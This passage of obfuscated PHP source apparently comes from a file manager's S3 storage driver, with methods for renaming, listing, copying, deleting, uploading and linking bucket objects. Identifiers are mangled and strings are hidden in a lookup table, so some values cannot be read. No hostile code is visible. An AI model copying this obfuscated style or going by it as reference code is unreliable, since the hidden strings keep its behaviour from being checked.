@file_exists($…«ù·¢‡) ? IO::fileOut($…«ù·¢‡) : $this->fileOut($˜ö…Åë€); } if (!($Ù²ã‰Öô = IO::move($Â¨ÏÑğ, $Ï¨•–¸ù))) { return IO::fileOut($Â¨ÏÑğ); } del_file($Â¨ÏÑğ); IO::fileOut($Ù²ã‰Öô); } public function fileOutImageServer($Š¤ÌÁÖ, $¼ä×·“ = 250) { $this->fileOutImage($Š¤ÌÁÖ, $¼ä×·“); } public function fileNameAuto($„ÏóÎ•, $³¹›µÍÚ, $Ùß ´ß‡ = REPEAT_RENAME, $†ƒ±Ø… = false) { $••¤ü§ƒ =& $_SERVER[Å¶¨Şêº]; $ô™÷Ø†ø = $„ÏóÎ• === $••¤ü§ƒ[12] ? $³¹›µÍÚ : rtrim($„ÏóÎ•, $••¤ü§ƒ[8]) . $••¤ü§ƒ[8] . $³¹›µÍÚ; if ($Ùß ´ß‡ == REPEAT_REPLACE || !$this->exist($ô™÷Ø†ø) || $†ƒ±Ø… && $Ùß ´ß‡ != REPEAT_RENAME_FOLDER) { return $³¹›µÍÚ; } if ($Ùß ´ß‡ == REPEAT_SKIP) { return !1; } $ÌĞ˜©­“ = $••¤ü§ƒ[10] . get_path_ext($³¹›µÍÚ); $ÌĞ˜©­“ = $ÌĞ˜©­“ == $••¤ü§ƒ[10] || $†ƒ±Ø… ? $••¤ü§ƒ[12] : $ÌĞ˜©­“; $´ÂÈ¤¡Ö = 1; $×ßÓ®ı¨ = substr($³¹›µÍÚ, 0, strlen($³¹›µÍÚ) - strlen($ÌĞ˜©­“)); $õ£ò¨Ñç = $×ßÓ®ı¨ . "\x28{$´ÂÈ¤¡Ö}\x29{$ÌĞ˜©­“}"; while ($this->exist(rtrim($„ÏóÎ•, $••¤ü§ƒ[8]) . $••¤ü§ƒ[8] . $õ£ò¨Ñç)) { $õ£ò¨Ñç = $×ßÓ®ı¨ . "\50{$´ÂÈ¤¡Ö}\x29{$ÌĞ˜©­“}"; $´ÂÈ¤¡Ö++; } return $õ£ò¨Ñç; } private function fileNameAutoList($¬ë‡ÌÌË, $íŠÁ—»æ, $é¿Ğ•é© = false) { $‚ÊàÑ  =& $_SERVER[Å¶¨Şêº]; $ñÂÛ¢¹« = $this->listPath($¬ë‡ÌÌË, !0); $ñÂÛ¢¹« = array_merge($ñÂÛ¢¹«[$‚ÊàÑ [93]], $ñÂÛ¢¹«[$‚ÊàÑ [94]]); $ÙÆ’ûà¿ = array_to_keyvalue($ñÂÛ¢¹«, $‚ÊàÑ [12], $‚ÊàÑ [42]); $¾œ™åğ‹ = $‚ÊàÑ [10] . get_path_ext($íŠÁ—»æ); $¾œ™åğ‹ = $¾œ™åğ‹ == $‚ÊàÑ [10] || $é¿Ğ•é© ? $‚ÊàÑ [12] : $¾œ™åğ‹; $ãşÍ¤ã“ = substr($íŠÁ—»æ, 0, strlen($íŠÁ—»æ) - strlen($¾œ™åğ‹)); $²ç‚è§› = $ãşÍ¤ã“ . "\x28\60\51{$¾œ™åğ‹}"; for ($¨ÕºÊ‰ã = 1; $¨ÕºÊ‰ã <= count($ÙÆ’ûà¿) + 1; $¨ÕºÊ‰ã++) { $²ç‚è§› = $ãşÍ¤ã“ . "\50{$¨ÕºÊ‰ã}\x29{$¾œ™åğ‹}"; if (!in_array_not_case($²ç‚è§›, $ÙÆ’ûà¿)) { return $²ç‚è§›; } } return $²ç‚è§›; } public function listAllFiles($€é·­Õ¿, $ø™±è…) { $¬ßÃ°Âè =& $_SERVER[Å¶¨Şêº]; if (empty($ø™±è…)) { return array(); } $şû“ÀÜÍ = array_keys($ø™±è…); $æôÁÚ = array(); $€é·­Õ¿ = trim($€é·­Õ¿, $¬ßÃ°Âè[8]); foreach ($ø™±è… as $ƒÀ•Ğ­‚ => $ªÌñ÷ƒö) { $¡Ì­Ë¼ = ltrim(substr(trim($ƒÀ•Ğ­‚, $¬ßÃ°Âè[8]), strlen($€é·­Õ¿)), $¬ßÃ°Âè[8]); if (substr($ƒÀ•Ğ­‚, -1) == $¬ßÃ°Âè[8]) { $¡Ì­Ë¼ = rtrim($¡Ì­Ë¼, $¬ßÃ°Âè[8]) . $¬ßÃ°Âè[8]; } $æôÁÚ = array_merge($æôÁÚ, $this->slicePath($¡Ì­Ë¼)); } $·“Ñù’© = array(); foreach (array_unique($æôÁÚ) as $ŸÁóÔüî) { $»Åò©¼ø = array($¬ßÃ°Âè[95] => $this->getPathOuter($¬ßÃ°Âè[8] . $€é·­Õ¿ . $¬ßÃ°Âè[8] . $ŸÁóÔüî), $¬ßÃ°Âè[86] => 1, $¬ßÃ°Âè[87] => 0); if (substr($ŸÁóÔüî, -1) != $¬ßÃ°Âè[8]) { $»Åò©¼ø[$¬ßÃ°Âè[86]] = 0; $ÉÑˆÛÀ = $this->getPath($€é·­Õ¿ . $¬ßÃ°Âè[8] . $ŸÁóÔüî); if (isset($ø™±è…[$ÉÑˆÛÀ])) { $óÅÌ·Ù = $ø™±è…[$ÉÑˆÛÀ]; if (isset($óÅÌ·Ù[$¬ßÃ°Âè[87]])) { $»Åò©¼ø[$¬ßÃ°Âè[87]] = intval($óÅÌ·Ù[$¬ßÃ°Âè[87]]); } if (isset($óÅÌ·Ù[$¬ßÃ°Âè[191]])) { $»Åò©¼ø[$¬ßÃ°Âè[96]] = intval($óÅÌ·Ù[$¬ßÃ°Âè[191]]); } } } $·“Ñù’©[] = $»Åò©¼ø; } return $·“Ñù’©; } public function slicePath($ïÇ†÷†Á) { $ˆ™ØÁ…˜ =& $_SERVER[Å¶¨Şêº]; $€à˜º±Ö = explode($ˆ™ØÁ…˜[8], trim($ïÇ†÷†Á, $ˆ™ØÁ…˜[8])); $çáÅ¦Î¾ = 0; do { ++$çáÅ¦Î¾; $ç²Ë¡‰[] = implode($ˆ™ØÁ…˜[8], array_slice($€à˜º±Ö, 0, $çáÅ¦Î¾)) . $ˆ™ØÁ…˜[8]; } while ($çáÅ¦Î¾ < count($€à˜º±Ö)); $ç²Ë¡‰[count($€à˜º±Ö) - 1] = $ïÇ†÷†Á; return $ç²Ë¡‰; } public function getHost() { $ÓüÈŸÁÃ =& $_SERVER[Å¶¨Şêº]; $èÒõƒó£ = parse_url(trim($this->domain, $ÓüÈŸÁÃ[8])); $‚ÈÜñĞ« = isset($èÒõƒó£[$ÓüÈŸÁÃ[192]]) ? $èÒõƒó£[$ÓüÈŸÁÃ[192]] : http_type(); $¾Èµ£Ó = isset($èÒõƒó£[$ÓüÈŸÁÃ[193]]) ? $èÒõƒó£[$ÓüÈŸÁÃ[193]] : $èÒõƒó£[$ÓüÈŸÁÃ[95]]; if (isset($èÒõƒó£[$ÓüÈŸÁÃ[194]])) { $¾Èµ£Ó .= $ÓüÈŸÁÃ[4] . $èÒõƒó£[$ÓüÈŸÁÃ[194]]; } return $‚ÈÜñĞ« . $ÓüÈŸÁÃ[195] . $¾Èµ£Ó; } public function pathEncode($ƒ‚’ğ„) { $³ÃŠÉÌ¬ =& $_SERVER[Å¶¨Şêº]; return str_replace($³ÃŠÉÌ¬[196], $³ÃŠÉÌ¬[8], rawurlencode($ƒ‚’ğ„)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($Òôƒ…ÍÊ) { set_timeout(); require_once SDK_DIR . $_SERVER[Å¶¨Şêº][197]; parent::__construct(); $this->_init($Òôƒ…ÍÊ); } public function _init($Öò—¯ï) { $this->config = $Öò—¯ï; foreach ($Öò—¯ï as $èôõÂÉ· => $”ğøøñ½) { if (isset($this->{$èôõÂÉ·})) { $this->{$èôõÂÉ·} = $”ğøøñ½; } } $this->endpoint = $Öò—¯ï[$_SERVER[Å¶¨Şêº][198]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($ğ‡ª¦Œ = "\x76\x34") { $this->signVer = $ğ‡ª¦Œ; $this->client->setSignatureVersion($ğ‡ª¦Œ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $ÎÄ×·òù =& $_SERVER[Å¶¨Şêº]; $İÜŒË«Ö = $this->getBucketCors(); if (!$İÜŒË«Ö || !is_array($İÜŒË«Ö)) { return !1; } if ($İÜŒË«Ö[$ÎÄ×·òù[199]] != $ÎÄ×·òù[200] || $İÜŒË«Ö[$ÎÄ×·òù[201]] != $ÎÄ×·òù[200]) { return !1; } $†İÖÈ§Ç = array_map($ÎÄ×·òù[202], $İÜŒË«Ö[$ÎÄ×·òù[203]]); if (!is_array($†İÖÈ§Ç)) { $†İÖÈ§Ç = array(); } $š„üõüê = array($ÎÄ×·òù[204], $ÎÄ×·òù[205], $ÎÄ×·òù[206], $ÎÄ×·òù[207], $ÎÄ×·òù[208]); $›ˆú²û = array_diff($š„üõüê, $†İÖÈ§Ç); return empty($›ˆú²û); } public function mkfile($«ÚĞ¹é, $÷Ïó²ß· = '', $à©©¨ú  = REPEAT_RENAME) { $Ï´‘¢µ” = $this->setContent($«ÚĞ¹é, $÷Ïó²ß·); if ($Ï´‘¢µ” !== !1) { return $this->getPathOuter($«ÚĞ¹é); } return !1; } public function mkdir($íş¢Ù, $›»×é¬ = REPEAT_SKIP) { $Ë„÷£Ç­ =& $_SERVER[Å¶¨Şêº]; if (empty($íş¢Ù) && $íş¢Ù !== $Ë„÷£Ç­[209]) { return !1; } if ($›»×é¬ && $this->_isFolder($íş¢Ù)) { return $this->getPathOuter($íş¢Ù); } $È‘Æ“Æ = $this->setContent($íş¢Ù, $Ë„÷£Ç­[12], !0); if ($È‘Æ“Æ !== !1) { return $this->getPathOuter($íş¢Ù); } return !1; } public function copyFile($±­«“é¿, $»ãõ, $İéõÂˆ’ = array()) { $ö¿İ•¸ =& $_SERVER[Å¶¨Şêº]; $¯öÕ‚± = $this->objectMeta($±­«“é¿); if (!$¯öÕ‚±) { return !1; } if ($¯öÕ‚±[$ö¿İ•¸[87]] <= 1024 * 1024 * 200) { $ªØ«œé… = $this->client->copyObject($this->bucket, $±­«“é¿, $this->bucket, $»ãõ, $ö¿İ•¸[210], $İéõÂˆ’); } else { $ªØ«œé… = $this->client->multiCopyObject($this->bucket, $±­«“é¿, $this->bucket, $»ãõ, $İéõÂˆ’); } $ªØ«œé… = $ªØ«œé… ? $this->getPathOuter($»ãõ) : !1; return $ªØ«œé…; } public function moveFile($ü›ô‘æ©, $İ¤åÜ÷ˆ) { if ($this->copyFile($ü›ô‘æ©, $İ¤åÜ÷ˆ)) { $this->delFile($ü›ô‘æ©); return $this->getPathOuter($İ¤åÜ÷ˆ); } return !1; } public function delFile($¼˜àÓƒ) { return $this->client->deleteObject($this->bucket, $¼˜àÓƒ); } public function delFolder($ı¯ı’¤‡) { $·ˆ“¹É¿ =& $_SERVER[Å¶¨Şêº]; if (!$this->exist($ı¯ı’¤‡)) { return !0; } $this->listItemCache = !1; $‚éĞÜ ı = $this->fileList($ı¯ı’¤‡); $this->listItemCache = !0; $Ñ«Ãàé = trim($ı¯ı’¤‡, $·ˆ“¹É¿[8]) . $·ˆ“¹É¿[8]; if (!empty($ı¯ı’¤‡) && $ı¯ı’¤‡ !== $·ˆ“¹É¿[209] && !in_array($Ñ«Ãàé, $‚éĞÜ ı[$·ˆ“¹É¿[93]])) { $‚éĞÜ ı[$·ˆ“¹É¿[93]][] = $Ñ«Ãàé; } $á«íé’â = $this->delByBatch($‚éĞÜ ı[$·ˆ“¹É¿[94]]); if (!$á«íé’â) { return !1; } $á«íé’â = $this->delByBatch($‚éĞÜ ı[$·ˆ“¹É¿[93]]); if (!$á«íé’â) { return !1; } return $this->delFile($Ñ«Ãàé); } private function delByBatch($™šœÙ±ì) { foreach (array_chunk($™šœÙ±ì, 1000) as $”¥‚èÚµ) { $Ìº°«ÙÄ = $this->client->deleteObjects($this->bucket, $”¥‚èÚµ); if (!$Ìº°«ÙÄ) { return !1; } } return !0; } public function rename($‚ÄÜÖá, $†Ó˜‹ô) { return $this->renameObject($‚ÄÜÖá, $†Ó˜‹ô); } public function listPath($³Ö¾¼¥Ì, $÷Í…ÔË = false) { $şÔ»Ö =& $_SERVER[Å¶¨Şêº]; $ÌÄıñ³è = $this->fileList($³Ö¾¼¥Ì, $şÔ»Ö[8], !0); foreach ($ÌÄıñ³è[$şÔ»Ö[93]] as $Úáå§ĞÄ => $’ì¯Ë) { $ÌÄıñ³è[$şÔ»Ö[93]][$Úáå§ĞÄ] = $this->folderInfo($’ì¯Ë, $÷Í…ÔË, $’ì¯Ë); } foreach ($ÌÄıñ³è[$şÔ»Ö[94]] as $Úáå§ĞÄ => $’ì¯Ë) { $ÌÄıñ³è[$şÔ»Ö[94]][$Úáå§ĞÄ] = $this->fileInfo($’ì¯Ë[$şÔ»Ö[42]], $÷Í…ÔË, $’ì¯Ë); } return $ÌÄıñ³è; } protected function infoChildren($˜™Ô¾Œ—, &$¤èÒÆÒ) { $±Ãöë‚· =& $_SERVER[Å¶¨Şêº]; $¸å¡¼   = $this->fileList($˜™Ô¾Œ—, $±Ãöë‚·[12], !0); $¤èÒÆÒ[$±Ãöë‚·[89]] += count($¸å¡¼  [$±Ãöë‚·[93]]); $¤èÒÆÒ[$±Ãöë‚·[88]] += count($¸å¡¼  [$±Ãöë‚·[94]]); foreach ($¸å¡¼  [$±Ãöë‚·[94]] as $¨ªÉ±µÆ) { if (!$¨ªÉ±µÆ || !$¨ªÉ±µÆ[$±Ãöë‚·[87]]) { continue; } $¤èÒÆÒ[$±Ãöë‚·[87]] += $¨ªÉ±µÆ[$±Ãöë‚·[87]]; } } private function fileInfo($ìÎ®ß, $€•¦î¸¬ = false, $ÆšÂ°Ë˜ = array()) { $Íˆ³Ùå„ =& $_SERVER[Å¶¨Şêº]; $¢„Äúæ× = array($Íˆ³Ùå„[42] => $this->pathThis($ìÎ®ß), $Íˆ³Ùå„[95] => $this->getPathOuter($ìÎ®ß), $Íˆ³Ùå„[43] => $Íˆ³Ùå„[211], $Íˆ³Ùå„[185] => $this->ext($ìÎ®ß), $Íˆ³Ùå„[87] => isset($ÆšÂ°Ë˜[$Íˆ³Ùå„[87]]) ? $ÆšÂ°Ë˜[$Íˆ³Ùå„[87]] : 0); if ($€•¦î¸¬) { return $¢„Äúæ×; } $¢„Äúæ×[$Íˆ³Ùå„[212]] = $¢„Äúæ×[$Íˆ³Ùå„[96]] = 0; $¢„Äúæ×[$Íˆ³Ùå„[213]] = $¢„Äúæ×[$Íˆ³Ùå„[214]] = !0; if (empty($ÆšÂ°Ë˜)) { $ÆšÂ°Ë˜ = $this->objectMeta($ìÎ®ß); if (!$ÆšÂ°Ë˜) { return $¢„Äúæ×; } } if (isset($ÆšÂ°Ë˜[$Íˆ³Ùå„[191]])) { $¢„Äúæ×[$Íˆ³Ùå„[96]] = $ÆšÂ°Ë˜[$Íˆ³Ùå„[191]]; } if (isset($ÆšÂ°Ë˜[$Íˆ³Ùå„[87]])) { $¢„Äúæ×[$Íˆ³Ùå„[87]] = $ÆšÂ°Ë˜[$Íˆ³Ùå„[87]]; } return $¢„Äúæ×; } private function folderInfo($Âµı¤§á, $Î¬ÃÌ¡ê = false, $°ö©Í—… = array()) { $Õ‡Ó€İè =& $_SERVER[Å¶¨Şêº]; $ïÁ¶Œè× = array($Õ‡Ó€İè[42] => $this->pathThis($Âµı¤§á), $Õ‡Ó€İè[95] => $this->getPathOuter($Õ‡Ó€İè[8] . $Âµı¤§á), $Õ‡Ó€İè[43] => $Õ‡Ó€İè[86]); if ($Î¬ÃÌ¡ê) { return $ïÁ¶Œè×; } $ïÁ¶Œè×[$Õ‡Ó€İè[212]] = $ïÁ¶Œè×[$Õ‡Ó€İè[96]] = 0; $ïÁ¶Œè×[$Õ‡Ó€İè[213]] = $ïÁ¶Œè×[$Õ‡Ó€İè[214]] = !0; if ($Âµı¤§á == $Õ‡Ó€İè[12]) { return $ïÁ¶Œè×; } if (empty($°ö©Í—…)) { $°ö©Í—… = $this->objectMeta(trim($Âµı¤§á, $Õ‡Ó€İè[8]) . $Õ‡Ó€İè[8]); } if (isset($°ö©Í—…[$Õ‡Ó€İè[191]])) { $ïÁ¶Œè×[$Õ‡Ó€İè[212]] = $°ö©Í—…[$Õ‡Ó€İè[191]]; } return $ïÁ¶Œè×; } private function fileList($ë£à©®Ó, $æ®çÂ ‹ = '', $›ƒï”›Ú = 0) { $â­ıåŞ˜ =& $_SERVER[Å¶¨Şêº]; $¢şÈœŒ = rtrim($ë£à©®Ó, $â­ıåŞ˜[8]) . $â­ıåŞ˜[8]; $ÜŸûä¯— = $this->listObjs($¢şÈœŒ, null, null, $æ®çÂ ‹); if (!$ÜŸûä¯—) { return array($â­ıåŞ˜[93] => array(), $â­ıåŞ˜[94] => array()); } $Ú‹÷Æå¦ = $òêâÁÁ = array(); foreach ($ÜŸûä¯—[$â­ıåŞ˜[215]] as $±Ë¢ãˆ†) { $©ö˜›Ï = $±Ë¢ãˆ†[$â­ıåŞ˜[42]]; if ($©ö˜›Ï == $¢şÈœŒ) { continue; } $ıãÓ´÷Ù = isset($±Ë¢ãˆ†[$â­ıåŞ˜[87]]) ? $±Ë¢ãˆ†[$â­ıåŞ˜[87]] : 0; $ê¶¦¬‰ = $ıãÓ´÷Ù == 0 && substr($©ö˜›Ï, strlen($©ö˜›Ï) - 1, 1) == $â­ıåŞ˜[8] ? !0 : !1; $this->cacheMethodInfoSet($©ö˜›Ï, $ê¶¦¬‰, $±Ë¢ãˆ†); if ($ê¶¦¬‰) { $Ú‹÷Æå¦[] = $©ö˜›Ï; continue; } $òêâÁÁ[] = $›ƒï”›Ú ? $±Ë¢ãˆ† : $©ö˜›Ï; } foreach ($ÜŸûä¯—[$â­ıåŞ˜[216]] as $±Ë¢ãˆ†) { $Ú‹÷Æå¦[] = $±Ë¢ãˆ†[$â­ıåŞ˜[42]]; $this->cacheMethodInfoSet($±Ë¢ãˆ†[$â­ıåŞ˜[42]], !0); } $this->cacheMethodInfoSet($ë£à©®Ó, !0); return array($â­ıåŞ˜[93] => $Ú‹÷Æå¦, $â­ıåŞ˜[94] => $òêâÁÁ); } private function listObjs($­‡İÊã, $¨ã•î³é = null, $ÚÏ¸Ò°Ç = null, $í²İ† = null) { $‹äöùÂş =& $_SERVER[Å¶¨Şêº]; $­‡İÊã = trim($­‡İÊã, $‹äöùÂş[8]); $šÓô¸ìä = empty($­‡İÊã) && $­‡İÊã !== $‹äöùÂş[209] ? $‹äöùÂş[12] : $­‡İÊã . $‹äöùÂş[8]; return $this->client->getBucket($this->bucket, $šÓô¸ìä, $¨ã•î³é, $ÚÏ¸Ò°Ç, $í²İ†, !0); } public function has($¹Ş·Ÿ×Ÿ, $úÍÁßÙˆ = false, $ŒÏæ›ç = true) { $«Ã‘§ì =& $_SERVER[Å¶¨Şêº]; $¹Ş·Ÿ×Ÿ = trim($¹Ş·Ÿ×Ÿ, $«Ã‘§ì[8]); $ª ’‹®Œ = empty($¹Ş·Ÿ×Ÿ) && $¹Ş·Ÿ×Ÿ !== $«Ã‘§ì[209] ? $«Ã‘§ì[12] : $¹Ş·Ÿ×Ÿ . $«Ã‘§ì[8]; $¶·¬¤” = null; $üÀÒ³ğ• = 500; $‘Î­úÜ = $«Ã‘§ì[8]; $¦»ò£Â = $İ·î¦² = array(); while (!0) { $‹İ“”û = $this->listObjs($¹Ş·Ÿ×Ÿ, $¶·¬¤”, $üÀÒ³ğ•, $‘Î­úÜ); if (!$‹İ“”û) { break; } $¶·¬¤” = $‹İ“”û[$«Ã‘§ì[217]]; $êöûÒì = $‹İ“”û[$«Ã‘§ì[215]]; $£¶Œö¸ = $‹İ“”û[$«Ã‘§ì[216]]; if (empty($êöûÒì) && empty($£¶Œö¸)) { break; } if (count($êöûÒì) == 1 && $êöûÒì[0][$«Ã‘§ì[42]] == $ª ’‹®Œ) { break; } if ($úÍÁßÙˆ) { if (count($êöûÒì)) { $êöûÒì = array_column($êöûÒì, $«Ã‘§ì[42]); $¦»ò£Â = array_merge($¦»ò£Â, $êöûÒì); } if (count($£¶Œö¸)) { $£¶Œö¸ = array_column($£¶Œö¸, $«Ã‘§ì[42]); $İ·î¦² = array_merge($İ·î¦², $£¶Œö¸); } if ($¶·¬¤” === null) { break; } continue; } if ($ŒÏæ›ç) { if (!empty($êöûÒì)) { if (count($êöûÒì) > 1 || isset($êöûÒì[0][$«Ã‘§ì[42]]) && $êöûÒì[0][$«Ã‘§ì[42]] != $ª ’‹®Œ) { return !0; } } } else { if (!empty($£¶Œö¸)) { return !0; } } if ($¶·¬¤” === null) { break; } } if ($úÍÁßÙˆ) { $¦»ò£Â = array_diff($¦»ò£Â, array($ª ’‹®Œ)); $¦»ò£Â = count(array_unique($¦»ò£Â)); $İ·î¦² = count(array_unique($İ·î¦²)); return array($«Ã‘§ì[218] => $¦»ò£Â, $«Ã‘§ì[219] => $İ·î¦²); } return !1; } public function listAll($ñêûŠÅĞ) { $œî“äïÅ =& $_SERVER[Å¶¨Şêº]; $±çÛ†º = $this->fileList($ñêûŠÅĞ, $œî“äïÅ[12], !0); $ÏËœ’‡ = array_to_keyvalue($±çÛ†º[$œî“äïÅ[94]], $œî“äïÅ[42]); foreach ($±çÛ†º[$œî“äïÅ[93]] as $ş¯˜ÆÈñ) { if (is_string($ş¯˜ÆÈñ)) { $ÏËœ’‡[$ş¯˜ÆÈñ] = array($œî“äïÅ[87] => 0); } } return $this->listAllFiles($ñêûŠÅĞ, $ÏËœ’‡); } public function canRead($ÇÀºÉÜû) { $¡›ùºçÂ =& $_SERVER[Å¶¨Şêº]; $¹Àšñ„æ = $this->client->getAccessControlPolicy($this->bucket, $ÇÀºÉÜû); if (!$¹Àšñ„æ) { return !1; } return in_array($¹Àšñ„æ, array($¡›ùºçÂ[220], $¡›ùºçÂ[221], $¡›ùºçÂ[222])) ? !0 : !1; } public function canWrite($–Ü£ò¹Ì) { $„áÎÉ™º =& $_SERVER[Å¶¨Şêº]; $ØÓª€Ç‚ = $this->client->getAccessControlPolicy($this->bucket, $–Ü£ò¹Ì); if (!$ØÓª€Ç‚) { return !1; } return in_array($ØÓª€Ç‚, array($„áÎÉ™º[220], $„áÎÉ™º[221])) ? !0 : !1; } public function getContent($Ş™¯˜‹) { return $this->client->getObject($this->bucket, $Ş™¯˜‹); } public function setContent($çµÏ¶¹, $‰ûå°š¡ = '', $‰êáƒ = false) { $‚¨†ù´à =& $_SERVER[Å¶¨Şêº]; $çµÏ¶¹ = $‰êáƒ ? trim($çµÏ¶¹, $‚¨†ù´à[8]) . $‚¨†ù´à[8] : $çµÏ¶¹; $èöôõ¦ = get_file_mime(get_path_ext($çµÏ¶¹)); $¿†æÃæ£ = $this->client->putObject($‰ûå°š¡, $this->bucket, $çµÏ¶¹, $‚¨†ù´à[210], array(), $èöôõ¦); if (!$¿†æÃæ£) { return !1; } if ($‰êáƒ) { return !0; } $this->cacheMethod(null, null); $¿†æÃæ£ = $this->copyFile($çµÏ¶¹, $çµÏ¶¹, array($‚¨†ù´à[223] => $¿†æÃæ£[$‚¨†ù´à[224]])); return $¿†æÃæ£ ? !0 : !1; } public function fileSubstr($š¨ù‘ã“, $ñƒı²ÄÃ, $š–³İ½) { $µªŸü’½ = $ñƒı²ÄÃ + $š–³İ½ - 1; return $this->client->getObject($this->bucket, $š¨ù‘ã“, array($_SERVER[Å¶¨Şêº][225] => "\142\171\x74\x65\163\75{$ñƒı²ÄÃ}\x2d{$µªŸü’½}")); } public function upload($ÜôœªÕæ, $‡¡Êí½, $Øï¼»û× = false, $ºßÅ˜ş = REPEAT_REPLACE) { $’××¢ =& $_SERVER[Å¶¨Şêº]; $ïŞ©í°ä = array($’××¢[223] => @md5_file($‡¡Êí½)); $ö—ˆ¥ù© = array($’××¢[226] => get_file_mime(get_path_ext($ÜôœªÕæ))); if (IO::size($‡¡Êí½) <= 1024 * 1024 * 200) { $Ô¡³úš­ = $this->client->putObjectFile($‡¡Êí½, $this->bucket, $ÜôœªÕæ, $’××¢[210], $ïŞ©í°ä, $ö—ˆ¥ù©); return !empty($Ô¡³úš­) ? $this->getPathOuter($ÜôœªÕæ) : !1; } $›†Ğ®» = $this->client->multiUploadObject($‡¡Êí½, $this->bucket, trim($ÜôœªÕæ, $’××¢[8]), $ïŞ©í°ä, $ö—ˆ¥ù©); return $›†Ğ®» ? $this->getPathOuter($ÜôœªÕæ) : !1; } public function download($µïÎ±£¡, $±È’éñ¼) { if (!@is_dir($this->pathFather($±È’éñ¼)) && !IO::mkdir($this->pathFather($±È’éñ¼))) { return !1; } $Èá»ì³ = $this->client->getObject($this->bucket, $µïÎ±£¡, array(), $±È’éñ¼); return $Èá»ì³ !== !1 ? $±È’éñ¼ : !1; } public function link($ƒœ«‰Ê¬, $‹åáü¦û = array()) { $¤Úå¶© =& $_SERVER[Å¶¨Şêº]; if ($this->signVer == $¤Úå¶©[227]) { return $this->client->getAuthenticatedURL($this->bucket, $ƒœ«‰Ê¬, 3600 * 12, $‹åáü¦û); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($ƒœ«‰Ê¬, $¤Úå¶©[8]), 3600 * 12, $this->region, array(), !0, $‹åáü¦û); } public function fileOut($¨ì‘çªİ, $óÆªûïí = false, $ò­½Êë = false, $‹±óú¬ = '') { $£Â’ÑÈ… =& $_SERVER[Å¶¨Şêº]; if ($this->isFileOutServer()) { return $this->fileOutServer($¨ì‘çªİ, $óÆªûïí, $ò­½Êë, $‹±óú¬); } if (!$ò­½Êë) { $ò­½Êë = $this->pathThis($¨ì‘çªİ); } $•ëÄÅÚ• = get_file_mime(get_path_ext($ò­½Êë)); if ($•ëÄÅÚ• == $£Â’ÑÈ…[228]) { return parent::fileOut($¨ì‘çªİ, $óÆªûïí, $ò­½Êë, $‹±óú¬); } $ÅÕ±Şß = array($£Â’ÑÈ…[229] => $•ëÄÅÚ•); if ($óÆªûïí) { $ÅÕ±Şß[$£Â’ÑÈ…[230]] = $£Â’ÑÈ…[231] . rawurlencode($ò­½Êë); } else { } $ÖÃÒšã‰ = $this->link($¨ì‘çªİ, $ÅÕ±Şß); $this->fileOutLink($ÖÃÒšã‰); } public function fileOutServer($Œ÷„Ûµ², $¾ƒˆúõ = false, $ß·ÏóÊ“ = false, $›øºÛ¹Œ = '') { parent::fileOut($Œ÷„Ûµ², $¾ƒˆúõ, $ß·ÏóÊ“, $›øºÛ¹Œ); } public function fileOutImageServer($±Øºº¤•, $‰Şƒ—Í = 250) { parent::fileOutImage($±Øºº¤•, $‰Şƒ—Í); } public function hashMd5($½‘ÚËÎÙ, $«¨É¤ğÍ = '') { $Ã²—ğ¯ =& $_SERVER[Å¶¨Şêº]; $ŒÙ†Èª” = $this->objectMeta($½‘ÚËÎÙ); if (!$ŒÙ†Èª”) { return !1; } $«¨É¤ğÍ = $«¨É¤ğÍ ? $«¨É¤ğÍ : _get($ŒÙ†Èª”, $Ã²—ğ¯[232]); $«¨É¤ğÍ = $«¨É¤ğÍ ? $«¨É¤ğÍ : _get($ŒÙ†Èª”, $Ã²—ğ¯[224], $Ã²—ğ¯[12]); return $«¨É¤ğÍ; } public function uploadFormData($ê™ûÜ©¿, $¼¢ÃÉñ¦ = 3600) { $€³·Óø§ =& $_SERVER[Å¶¨Şêº]; $‘¸£êÚø = $this->pathFather($ê™ûÜ©¿); $Ù¦ñ²» = $this->client->getHttpUploadPostParams($this->bucket, $‘¸£êÚø, $€³·Óø§[210], $¼¢ÃÉñ¦); return array_merge((array) $Ù¦ñ²», array($€³·Óø§[193] => $this->getHost())); } public function multiUploadFormData($ãõõ–Ñ«, $‡ÑæØÖ¡ = 3600) { $â¢î½ã =& $_SERVER[Å¶¨Şêº]; $“ıÈú¸  = gmdate($â¢î½ã[233]); $İÚ«ÓÖª = array(); $®Å‚“ºÓ = $this->client->getUploadId($this->bucket, $ãõõ–Ñ«, $İÚ«ÓÖª); if (!$®Å‚“ºÓ) { return !1; } return array($â¢î½ã[234] => $®Å‚“ºÓ, $â¢î½ã[193] => $this->getHost() . $â¢î½ã[8] . $this->pathEncode($ãõõ–Ñ«), $â¢î½ã[235] => $“ıÈú¸ , $â¢î½ã[105] => $ãõõ–Ñ«); } public function multiUploadAuthData($Á¸…¶ô¤, $ÂÇøÊš = array()) { $ãÂ¸À®Ì =& $_SERVER[Å¶¨Şêº]; $ŞÊˆä = isset($ÂÇøÊš[$ãÂ¸À®Ì[235]]) ? $ÂÇøÊš[$ãÂ¸À®Ì[235]] : gmdate($ãÂ¸À®Ì[233]); $ÎÏŠÃªê = isset($ÂÇøÊš[$ãÂ¸À®Ì[185]]) ? $ÂÇøÊš[$ãÂ¸À®Ì[185]] : $ãÂ¸À®Ì[12]; $å§¾Äñï = $ÂÇøÊš[$ãÂ¸À®Ì[105]]; unset($ÂÇøÊš[$ãÂ¸À®Ì[105]]); if (isset($ÂÇøÊš[$ãÂ¸À®Ì[236]])) { $ÂÇøÊš[$ãÂ¸À®Ì[235]] = $ŞÊˆä; return $this->listUploadParts($å§¾Äñï, $ÂÇøÊš); } $ˆò¬ı² = array($ãÂ¸À®Ì[237], $ãÂ¸À®Ì[12], $ãÂ¸À®Ì[131], $ãÂ¸À®Ì[12], "\x78\55\x61\x6d\172\x2d\144\141\164\145\72{$ŞÊˆä}", $ãÂ¸À®Ì[8] . $this->bucket . $ãÂ¸À®Ì[8] . $this->pathEncode($å§¾Äñï) . $ÎÏŠÃªê); if 